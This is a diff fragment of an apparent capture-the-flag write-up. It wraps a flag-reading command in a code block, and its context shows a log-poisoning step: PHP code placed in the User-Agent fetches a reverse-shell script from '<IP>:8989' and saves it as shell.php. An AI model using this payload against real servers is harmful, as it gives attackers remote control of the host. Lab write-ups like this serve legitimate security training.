@@ -28,4 +28,6 @@ Modify User Agent with Burp or another proxy to PHP code.
 <?php file_put_contents('shell.php', file_get_contents('http://<IP>:8989/php-reverse-shell.php'))?
 ```
 ### Flag
+```bash
 cat /var/www/flag2_QMW7JvaY2LvK.txt
+```
